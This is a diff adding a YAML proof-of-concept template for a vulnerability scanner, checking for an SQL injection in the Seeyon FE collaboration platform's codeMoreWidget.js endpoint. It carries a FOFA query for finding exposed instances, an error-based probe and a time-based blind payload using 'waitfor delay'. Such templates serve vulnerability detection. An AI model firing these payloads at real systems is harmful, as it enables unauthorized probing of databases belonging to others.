@@ -1,0 +1,26 @@
+id: poc-yaml-seeyon-hulian-fe-codemorewidget-js-sqli
+info:
+  name: 致远互联FE协作办公平台 codeMoreWidget.js SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致远互联-FE
+  fofa: app="致远互联-FE"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /common/codeMoreWidget.js%70
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: code=-1'
+  expression: status_code == 500 && contains(body,"sqlserver.jdbc.SQLServerException:")
+    && contains(body,"bad SQL")
+- method: POST
+  path: /common/codeMoreWidget.js%70
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: code=-1';waitfor delay '0:0:{{.t1}}'--
+  expression: status_code == 200 && duration > t1 && duration < t2
+transport: http
